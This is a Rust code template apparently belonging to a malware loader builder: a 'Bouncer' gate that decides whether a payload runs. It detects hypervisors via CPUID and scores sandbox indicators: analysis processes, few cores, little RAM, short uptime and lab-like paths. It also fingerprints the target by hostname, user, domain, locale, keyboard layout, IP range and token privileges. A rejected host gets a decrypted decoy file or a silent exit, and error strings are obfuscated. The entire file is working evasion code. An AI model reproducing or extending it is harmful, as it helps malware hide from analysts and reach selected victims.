// --- Bouncer (technique fragment) ---

use windows::core::{PCWSTR, PWSTR};
use windows::Win32::Foundation::{
    BOOL, CloseHandle, ERROR_BUFFER_OVERFLOW, ERROR_NO_DATA, GetLastError, HANDLE, HMODULE, LUID,
};
use windows::Win32::Globalization::GetUserDefaultLocaleName;
use windows::Win32::NetworkManagement::IpHelper::{
    GAA_FLAG_SKIP_ANYCAST, GAA_FLAG_SKIP_DNS_SERVER, GAA_FLAG_SKIP_MULTICAST, GetAdaptersAddresses,
    IP_ADAPTER_ADDRESSES_LH,
};
use windows::Win32::NetworkManagement::Ndis::IfOperStatusUp;
use windows::Win32::Networking::WinSock::{
    AF_INET, AF_INET6, AF_UNSPEC, SOCKADDR_IN, SOCKADDR_IN6,
};
use windows::Win32::Security::{
    GetSidSubAuthority, GetSidSubAuthorityCount, GetTokenInformation, LookupPrivilegeValueW,
    PrivilegeCheck, SE_PRIVILEGE_ENABLED, TOKEN_ELEVATION, TOKEN_MANDATORY_LABEL, TOKEN_QUERY,
    TokenElevation, TokenIntegrityLevel, LUID_AND_ATTRIBUTES, PRIVILEGE_SET,
};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::LibraryLoader::GetModuleFileNameW;
use windows::Win32::System::SystemInformation::{
    ComputerNameDnsDomain, GetComputerNameExW, GetSystemInfo, GetTickCount64, GlobalMemoryStatusEx,
    MEMORYSTATUSEX, SYSTEM_INFO,
};
use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
use windows::Win32::System::WindowsProgramming::{GetComputerNameW, GetUserNameW};
use windows::Win32::UI::Input::KeyboardAndMouse::{
    GetKeyboardLayout, GetKeyboardLayoutList, GetKeyboardLayoutNameW, HKL,
};

/// Whether the host must not be a hypervisor guest.
const REQUIRE_NOT_HYPERVISOR: bool = $REQUIRE_HYPERVISOR$;
/// Whether the host must not look like an analysis environment.
const REQUIRE_NOT_SANDBOX: bool = $REQUIRE_SANDBOX$;
/// Whether a rejected host writes the configured decoy.
const ON_REJECT_DECOY: bool = $ON_REJECT_DECOY$;
/// Whether the rejection path exits the process (instead of returning `false`).
const ON_REJECT_EXIT: bool = $ON_REJECT_EXIT$;
/// Exit code used by the rejection path when `ON_REJECT_EXIT` is set.
const EXIT_CODE: i32 = $EXIT_CODE$;

/// Number of environment indicators that must coincide before the aggregate
/// heuristic reports a sandbox-like host. Deliberately conservative (3): a
/// false negative lets the payload run where it should have been blocked, while
/// a false positive blocks a legitimate target. This is the documented tradeoff
/// of the technique.
const ENV_SCORE_THRESHOLD: u32 = 3;
/// Processor count below which a host looks like a sandbox.
const ENV_MIN_CORES: u32 = 2;
/// Physical memory (MiB) below which a host looks like a sandbox.
const ENV_MIN_RAM_MB: u64 = 2048;
/// Uptime (minutes) below which a host looks like a sandbox.
const ENV_MIN_UPTIME_MIN: u64 = 10;

/// Gate entry point: evaluates the declared requirements and returns `false`
/// when the pipeline must abort (so the payload is not run).
///
/// With no requirement declared this is a no-op and returns `true`. The
/// `anti_analysis` checks are hard vetoes: they apply even when `any_of` has a
/// passing entry.
pub fn bouncer() -> Result<bool, String> {
    let mut require_declared: u32 = 0;
    let mut require_passed: u32 = 0;
    let mut any_declared: u32 = 0;
    let mut any_passed: u32 = 0;

$REQUIRE_BLOCKS$
$ANY_OF_BLOCKS$

    let mut accepted = require_declared == 0 || require_passed == require_declared;
    if any_declared > 0 {
        accepted = accepted && any_passed > 0;
    }

    if REQUIRE_NOT_HYPERVISOR {
        let vendor_tokens: Vec<String> = $VENDOR_TOKENS$;
        let present = hypervisor_vendor_present(&vendor_tokens);
        crate::tech_dbg!("bouncer", "hypervisor present: {present}");
        accepted = accepted && !present;
    }

    if REQUIRE_NOT_SANDBOX {
        let env_processes: Vec<String> = $ANALYSIS_PROCESSES$;
        let env_tokens: Vec<String> = $ANALYSIS_PATH_TOKENS$;
        let score = env_score(&env_processes, &env_tokens)?;
        crate::tech_dbg!(
            "bouncer",
            "environment score {score} (limit {ENV_SCORE_THRESHOLD})"
        );
        accepted = accepted && score < ENV_SCORE_THRESHOLD;
    }

    crate::tech_dbg!(
        "bouncer",
        "require {require_passed}/{require_declared}, any {any_passed}/{any_declared}"
    );

    if accepted {
        crate::tech_dbg!("bouncer", "host accepted");
        return Ok(true);
    }
    crate::tech_dbg!("bouncer", "host rejected");

    // Rejected. The decoy (if configured) is written first; then `exit` leaves
    // an explicit signal and `abort` lets the runner exit with code 0.
    if ON_REJECT_DECOY {
        drop_decoy()?;
    }
    if ON_REJECT_EXIT {
        std::process::exit(EXIT_CODE);
    }
    Ok(false)
}

/// Case-insensitive glob match supporting `*` (any run) and `?` (one char).
///
/// A pattern without wildcards degenerates to an exact case-insensitive
/// comparison, which is the documented behaviour for `hostname`, `username` and
/// `domain`.
fn glob_match(pattern: &str, text: &str) -> bool {
    let pattern: Vec<char> = pattern.to_lowercase().chars().collect();
    let text: Vec<char> = text.to_lowercase().chars().collect();

    let mut p = 0usize;
    let mut t = 0usize;
    let mut star: Option<usize> = None;
    let mut resume = 0usize;

    while t < text.len() {
        if p < pattern.len() && (pattern[p] == '?' || pattern[p] == text[t]) {
            p += 1;
            t += 1;
        } else if p < pattern.len() && pattern[p] == '*' {
            star = Some(p);
            resume = t;
            p += 1;
        } else if let Some(star_pos) = star {
            p = star_pos + 1;
            resume += 1;
            t = resume;
        } else {
            return false;
        }
    }

    // Trailing wildcards match the empty remainder.
    while p < pattern.len() && pattern[p] == '*' {
        p += 1;
    }
    p == pattern.len()
}

/// Appends a failed Win32 call's error code to an obfuscated message.
///
/// The label is rebuilt from obfuscated bytes at the call site, so this literal
/// carries no diagnostic text.
fn win32_error(label: String, code: u32) -> String {
    format!("{label} (error {code})")
}

/// Decodes a NUL-terminated UTF-16 buffer, stopping at the first NUL (or at the
/// end of the buffer when it is not terminated).
fn wide_to_string(buffer: &[u16]) -> String {
    let length = match buffer.iter().position(|&unit| unit == 0) {
        Some(index) => index,
        None => buffer.len(),
    };
    String::from_utf16_lossy(&buffer[..length])
}

/// Encodes a string as a NUL-terminated UTF-16 buffer for the `*W` APIs.
fn to_wide(value: &str) -> Vec<u16> {
    value.encode_utf16().chain(core::iter::once(0)).collect()
}

/// Reads the computer name (`GetComputerNameW`).
fn computer_name() -> Result<String, String> {
    let mut buffer = [0u16; 256];
    let mut size = buffer.len() as u32;
    match unsafe { GetComputerNameW(PWSTR(buffer.as_mut_ptr()), &mut size) } {
        Ok(()) => {
            let name = wide_to_string(&buffer);
            crate::tech_dbg!("bouncer", "hostname '{name}'");
            Ok(name)
        }
        Err(error) => Err(win32_error(
            $MSG_COMPUTER_NAME_FAILED$,
            error.code().0 as u32,
        )),
    }
}

/// Reads the user name (`GetUserNameW`).
fn user_name() -> Result<String, String> {
    let mut buffer = [0u16; 256];
    let mut size = buffer.len() as u32;
    match unsafe { GetUserNameW(PWSTR(buffer.as_mut_ptr()), &mut size) } {
        Ok(()) => {
            let name = wide_to_string(&buffer);
            crate::tech_dbg!("bouncer", "user '{name}'");
            Ok(name)
        }
        Err(error) => Err(win32_error($MSG_USER_NAME_FAILED$, error.code().0 as u32)),
    }
}

/// Reads the DNS domain name (`GetComputerNameExW(ComputerNameDnsDomain)`).
///
/// A host outside a domain yields an empty string, so a `domain` requirement
/// then simply fails instead of erroring.
fn dns_domain() -> Result<String, String> {
    let mut buffer = [0u16; 256];
    let mut size = buffer.len() as u32;
    match unsafe {
        GetComputerNameExW(ComputerNameDnsDomain, PWSTR(buffer.as_mut_ptr()), &mut size)
    } {
        Ok(()) => Ok(wide_to_string(&buffer)),
        Err(error) => Err(win32_error($MSG_DOMAIN_FAILED$, error.code().0 as u32)),
    }
}

/// Reads the user's default locale (`GetUserDefaultLocaleName`), in BCP-47 form
/// (e.g. `en-US`).
fn locale_name() -> Result<String, String> {
    // LOCALE_NAME_MAX_LENGTH is 85.
    let mut buffer = [0u16; 85];
    let written = unsafe { GetUserDefaultLocaleName(&mut buffer) };
    if written <= 0 {
        return Err(win32_error($MSG_LOCALE_FAILED$, unsafe {
            GetLastError().0
        }));
    }
    let locale = wide_to_string(&buffer);
    crate::tech_dbg!("bouncer", "locale '{locale}'");
    Ok(locale)
}

/// Collects every active keyboard layout as a 4-digit uppercase hex code.
///
/// The code is the low 16 bits of the `HKL` (the language id): `0409` for US,
/// `0C0A` for Spain. Three sources feed the list: `GetKeyboardLayout` for the
/// calling thread, `GetKeyboardLayoutNameW` for its KLID string (trimmed to the
/// last four digits) and `GetKeyboardLayoutList` for every loaded layout.
fn keyboard_layouts() -> Result<Vec<String>, String> {
    let mut layouts: Vec<String> = Vec::new();

    let current = unsafe { GetKeyboardLayout(0) };
    if !current.is_invalid() {
        layouts.push(format!("{:04X}", current.0 as usize as u16));
    }

    let mut name = [0u16; 9];
    if unsafe { GetKeyboardLayoutNameW(&mut name) }.is_ok() {
        layouts.push(normalize_klid(&wide_to_string(&name)));
    }

    let count = unsafe { GetKeyboardLayoutList(None) };
    if count <= 0 {
        return Err(win32_error($MSG_KEYBOARD_FAILED$, unsafe {
            GetLastError().0
        }));
    }
    let mut list = vec![HKL(std::ptr::null_mut()); count as usize];
    let filled = unsafe { GetKeyboardLayoutList(Some(&mut list)) };
    if filled <= 0 {
        return Err(win32_error($MSG_KEYBOARD_FAILED$, unsafe {
            GetLastError().0
        }));
    }
    for hkl in list.iter().take(filled as usize) {
        layouts.push(format!("{:04X}", hkl.0 as usize as u16));
    }

    layouts.sort();
    layouts.dedup();
    Ok(layouts)
}

/// Normalizes a keyboard layout id to an uppercase 4-digit hex code: strips an
/// optional `0x` prefix and keeps the last four characters of the KLID string.
///
/// Works on characters, not bytes: a non-ASCII value must not panic on a byte
/// index that falls inside a multi-byte character.
fn normalize_klid(value: &str) -> String {
    let mut text = value.trim().to_ascii_uppercase();
    if let Some(stripped) = text.strip_prefix("0X") {
        text = stripped.to_string();
    }
    let chars: Vec<char> = text.chars().collect();
    if chars.len() > 4 {
        chars[chars.len() - 4..].iter().copied().collect()
    } else {
        text
    }
}

/// The architecture's `core::arch` module: the CPUID intrinsic moved between
/// `x86_64` and `x86` and is the only architecture-specific piece in this check.
#[cfg(target_arch = "x86_64")]
use core::arch::x86_64 as arch_intrinsics;
#[cfg(target_arch = "x86")]
use core::arch::x86 as arch_intrinsics;

/// Whether CPUID reports a hypervisor the check should reject.
///
/// `CPUID.1:ECX[31]` is the "running under a hypervisor" bit and leaf
/// `0x40000000` returns the 12-byte vendor string. Once the bit is set the host
/// is a guest, so a claim without a usable vendor leaf (no leaf, or an empty
/// vendor) counts as *present* rather than as an error: that is a gate decision,
/// not a failure to evaluate, so it must not abort the loader loudly. Only a
/// vendor that resolves and does *not* match a known token passes the check.
fn hypervisor_vendor_present(vendor_tokens: &[String]) -> bool {
    let features = unsafe { arch_intrinsics::__cpuid(1) };
    if features.ecx & (1 << 31) == 0 {
        // Bare metal: no hypervisor present bit.
        return false;
    }

    let max_leaf = unsafe { arch_intrinsics::__cpuid(0) }.eax;
    if max_leaf < 0x4000_0000 {
        // Claims a hypervisor but exposes no vendor leaf: treat as present.
        return true;
    }

    let leaf = unsafe { arch_intrinsics::__cpuid(0x4000_0000) };
    let mut vendor = Vec::with_capacity(12);
    for register in [leaf.ebx, leaf.ecx, leaf.edx] {
        vendor.extend_from_slice(&register.to_le_bytes());
    }
    if vendor.iter().all(|byte| *byte == 0) {
        return true;
    }

    let vendor = String::from_utf8_lossy(&vendor).to_ascii_lowercase();
    vendor_tokens
        .iter()
        .any(|token| vendor.contains(&token.to_ascii_lowercase()))
}

/// Aggregate environment heuristic.
///
/// Each indicator contributes one point: a known analysis process running, a
/// low processor count, little physical memory, a short uptime, or a path/user
/// name that reads like a lab. A score at or above [`ENV_SCORE_THRESHOLD`]
/// means "looks like a sandbox".
fn env_score(processes: &[String], tokens: &[String]) -> Result<u32, String> {
    let mut score = 0u32;

    if env_process_running(processes)? {
        score += 1;
    }
    if cpu_cores() < ENV_MIN_CORES {
        score += 1;
    }
    if total_ram_mb()? < ENV_MIN_RAM_MB {
        score += 1;
    }
    if uptime_minutes() < ENV_MIN_UPTIME_MIN {
        score += 1;
    }
    if path_looks_like_env(tokens) {
        score += 1;
    }

    Ok(score)
}

/// Whether any process in `names` is running.
///
/// Both the file name and its `.exe`-stripped stem are compared, so the
/// built-in list (which carries the `.exe` suffix) matches the snapshot's
/// `szExeFile` and a user entry without the suffix matches too.
fn env_process_running(names: &[String]) -> Result<bool, String> {
    let snapshot = match unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) } {
        Ok(handle) => handle,
        Err(error) => {
            return Err(win32_error(
                $MSG_PROCESS_ENUM_FAILED$,
                error.code().0 as u32,
            ));
        }
    };

    let mut entry = PROCESSENTRY32W {
        dwSize: core::mem::size_of::<PROCESSENTRY32W>() as u32,
        ..Default::default()
    };

    let mut found = false;
    if unsafe { Process32FirstW(snapshot, &mut entry) }.is_ok() {
        loop {
            let name = wide_to_string(&entry.szExeFile).to_ascii_lowercase();
            let stem = match name.strip_suffix(".exe") {
                Some(stem) => stem,
                None => name.as_str(),
            };
            let matched = names.iter().any(|candidate| {
                let candidate = candidate.to_ascii_lowercase();
                let candidate_stem = match candidate.strip_suffix(".exe") {
                    Some(value) => value,
                    None => candidate.as_str(),
                };
                name == candidate || stem == candidate_stem
            });
            if matched {
                found = true;
                break;
            }
            if unsafe { Process32NextW(snapshot, &mut entry) }.is_err() {
                break;
            }
        }
    }

    let _ = unsafe { CloseHandle(snapshot) };
    Ok(found)
}

/// Whether the image path or the user name contains an environment marker.
fn path_looks_like_env(tokens: &[String]) -> bool {
    let mut haystacks = vec![image_path().to_ascii_lowercase()];
    if let Ok(user) = user_name() {
        haystacks.push(user.to_ascii_lowercase());
    }
    haystacks.iter().any(|haystack| {
        tokens
            .iter()
            .any(|token| haystack.contains(&token.to_ascii_lowercase()))
    })
}

/// The full path of the running image (`GetModuleFileNameW`).
fn image_path() -> String {
    let mut buffer = [0u16; 1024];
    let written = unsafe { GetModuleFileNameW(HMODULE(std::ptr::null_mut()), &mut buffer) };
    let written = (written as usize).min(buffer.len());
    wide_to_string(&buffer[..written])
}

/// Physical processor count (`GetSystemInfo`).
fn cpu_cores() -> u32 {
    let mut info = SYSTEM_INFO::default();
    unsafe { GetSystemInfo(&mut info) };
    info.dwNumberOfProcessors
}

/// Total physical memory in MiB (`GlobalMemoryStatusEx`).
fn total_ram_mb() -> Result<u64, String> {
    let mut status = MEMORYSTATUSEX {
        dwLength: core::mem::size_of::<MEMORYSTATUSEX>() as u32,
        ..Default::default()
    };
    match unsafe { GlobalMemoryStatusEx(&mut status) } {
        Ok(()) => Ok(status.ullTotalPhys / 1024 / 1024),
        Err(error) => Err(win32_error(
            $MSG_MEMORY_QUERY_FAILED$,
            error.code().0 as u32,
        )),
    }
}

/// System uptime in minutes (`GetTickCount64`).
fn uptime_minutes() -> u64 {
    (unsafe { GetTickCount64() }) / 60_000
}

/// Collects every running process's file name, lowercased (`Toolhelp32`).
fn running_processes() -> Result<Vec<String>, String> {
    let snapshot = match unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) } {
        Ok(handle) => handle,
        Err(error) => {
            return Err(win32_error(
                $MSG_PROCESS_ENUM_FAILED$,
                error.code().0 as u32,
            ));
        }
    };

    let mut entry = PROCESSENTRY32W {
        dwSize: core::mem::size_of::<PROCESSENTRY32W>() as u32,
        ..Default::default()
    };

    let mut names = Vec::new();
    if unsafe { Process32FirstW(snapshot, &mut entry) }.is_ok() {
        loop {
            names.push(wide_to_string(&entry.szExeFile).to_ascii_lowercase());
            if unsafe { Process32NextW(snapshot, &mut entry) }.is_err() {
                break;
            }
        }
    }

    let _ = unsafe { CloseHandle(snapshot) };
    Ok(names)
}

/// IPv4 mask for `prefix`; `/0` is the all-zero mask.
fn mask_v4(prefix: u8) -> u32 {
    if prefix == 0 {
        0
    } else {
        u32::MAX << (32 - prefix)
    }
}

/// IPv6 mask for `prefix`; `/0` is the all-zero mask.
fn mask_v6(prefix: u8) -> u128 {
    if prefix == 0 {
        0
    } else {
        u128::MAX << (128 - prefix)
    }
}

/// Collects the unicast IPv4 and IPv6 addresses of every adapter that is up
/// (`GetAdaptersAddresses`).
///
/// Addresses are returned in host byte order so the mask comparison is a plain
/// integer operation. IPv4 addresses are widened to `u32`, IPv6 to `u128`.
fn local_addresses() -> Result<(Vec<u32>, Vec<u128>), String> {
    let flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER;
    let family = AF_UNSPEC.0 as u32;

    let mut size = 0u32;
    let first = unsafe { GetAdaptersAddresses(family, flags, None, None, &mut size) };
    if first == 0 || first == ERROR_NO_DATA.0 {
        return Ok((Vec::new(), Vec::new()));
    }
    if first != ERROR_BUFFER_OVERFLOW.0 || size == 0 {
        return Err(win32_error($MSG_IP_ENUM_FAILED$, first));
    }

    let mut words = vec![0u64; (size as usize + 7) / 8];
    let mut head = words.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES_LH;
    let code = unsafe { GetAdaptersAddresses(family, flags, None, Some(head), &mut size) };
    if code != 0 {
        return Err(win32_error($MSG_IP_ENUM_FAILED$, code));
    }

    let mut v4 = Vec::new();
    let mut v6 = Vec::new();
    while !head.is_null() {
        let adapter = unsafe { &*head };
        if adapter.OperStatus == IfOperStatusUp {
            let mut unicast = adapter.FirstUnicastAddress;
            while !unicast.is_null() {
                let entry = unsafe { &*unicast };
                let sockaddr = entry.Address.lpSockaddr;
                if !sockaddr.is_null() {
                    let address_family = unsafe { (*sockaddr).sa_family };
                    if address_family == AF_INET {
                        let address = unsafe { &*(sockaddr as *const SOCKADDR_IN) };
                        let raw = unsafe { address.sin_addr.S_un.S_addr };
                        v4.push(u32::from_be_bytes(raw.to_ne_bytes()));
                    } else if address_family == AF_INET6 {
                        let address = unsafe { &*(sockaddr as *const SOCKADDR_IN6) };
                        v6.push(u128::from_be_bytes(unsafe { address.sin6_addr.u.Byte }));
                    }
                }
                unicast = entry.Next;
            }
        }
        head = adapter.Next;
    }

    Ok((v4, v6))
}

/// Opens the current process token with `TOKEN_QUERY`.
fn open_token() -> Result<HANDLE, String> {
    let mut token = HANDLE::default();
    match unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) } {
        Ok(()) => Ok(token),
        Err(error) => Err(win32_error($MSG_TOKEN_FAILED$, error.code().0 as u32)),
    }
}

/// Whether the current token is elevated (`TokenElevation`).
fn token_is_elevated() -> Result<bool, String> {
    let token = open_token()?;
    let mut elevation = TOKEN_ELEVATION::default();
    let mut returned = 0u32;
    let result = match unsafe {
        GetTokenInformation(
            token,
            TokenElevation,
            Some(&mut elevation as *mut _ as *mut core::ffi::c_void),
            core::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut returned,
        )
    } {
        Ok(()) => Ok(elevation.TokenIsElevated != 0),
        Err(error) => Err(win32_error($MSG_TOKEN_FAILED$, error.code().0 as u32)),
    };
    let _ = unsafe { CloseHandle(token) };
    result
}

/// The integrity RID of the current token (`TokenIntegrityLevel`).
///
/// The token stores a mandatory-label SID; the level is the last sub-authority
/// (`0x1000` low, `0x2000` medium, `0x3000` high, `0x4000` system).
fn token_integrity() -> Result<u32, String> {
    let token = open_token()?;
    let mut needed = 0u32;
    let _ = unsafe {
        GetTokenInformation(
            token,
            TokenIntegrityLevel,
            None,
            0,
            &mut needed,
        )
    };
    let result = if needed == 0 {
        Err(win32_error($MSG_TOKEN_FAILED$, unsafe { GetLastError().0 }))
    } else {
        let mut words = vec![0u64; (needed as usize + 7) / 8];
        match unsafe {
            GetTokenInformation(
                token,
                TokenIntegrityLevel,
                Some(words.as_mut_ptr().cast()),
                needed,
                &mut needed,
            )
        } {
            Ok(()) => {
                let label = unsafe { &*(words.as_ptr() as *const TOKEN_MANDATORY_LABEL) };
                if label.Label.Sid.0.is_null() {
                    Err($MSG_TOKEN_FAILED$)
                } else {
                    let count = unsafe { *GetSidSubAuthorityCount(label.Label.Sid) };
                    if count == 0 {
                        Err($MSG_TOKEN_FAILED$)
                    } else {
                        Ok(unsafe {
                            *GetSidSubAuthority(label.Label.Sid, (count - 1) as u32)
                        })
                    }
                }
            }
            Err(error) => Err(win32_error($MSG_TOKEN_FAILED$, error.code().0 as u32)),
        }
    };
    let _ = unsafe { CloseHandle(token) };
    result
}

/// Whether `name` is enabled in the current token.
///
/// `PrivilegeCheck` answers exactly that: the privilege exists *and* is enabled
/// (an administrator's disabled `SeDebugPrivilege` does not pass).
fn privilege_enabled(name: &str) -> Result<bool, String> {
    let token = open_token()?;
    let wide = to_wide(name);
    let mut luid = LUID::default();
    let result = match unsafe { LookupPrivilegeValueW(PCWSTR::null(), PCWSTR(wide.as_ptr()), &mut luid) }
    {
        Ok(()) => {
            let mut set = PRIVILEGE_SET {
                PrivilegeCount: 1,
                Control: 0,
                Privilege: [LUID_AND_ATTRIBUTES {
                    Luid: luid,
                    Attributes: SE_PRIVILEGE_ENABLED,
                }],
            };
            let mut held = BOOL(0);
            match unsafe { PrivilegeCheck(token, &mut set, &mut held) } {
                Ok(()) => Ok(held.as_bool()),
                Err(error) => Err(win32_error(
                    $MSG_PRIVILEGE_FAILED$,
                    error.code().0 as u32,
                )),
            }
        }
        Err(error) => Err(win32_error(
            $MSG_PRIVILEGE_FAILED$,
            error.code().0 as u32,
        )),
    };
    let _ = unsafe { CloseHandle(token) };
    result
}

/// Writes the configured decoy to disk (decrypting the embedded asset).
///
/// A no-op when no path is declared, so the no-op gate never touches the disk.
fn drop_decoy() -> Result<(), String> {
    let path: Option<String> = $DECOY_PATH$;
    let path = match path {
        Some(path) => crate::expand_env(&path),
        None => return Ok(()),
    };
    let bytes = asset_bytes()?;
    std::fs::write(&path, &bytes).map_err(|_| $MSG_DECOY_WRITE_FAILED$)?;
    crate::tech_dbg!("bouncer", "decoy written");
    Ok(())
}
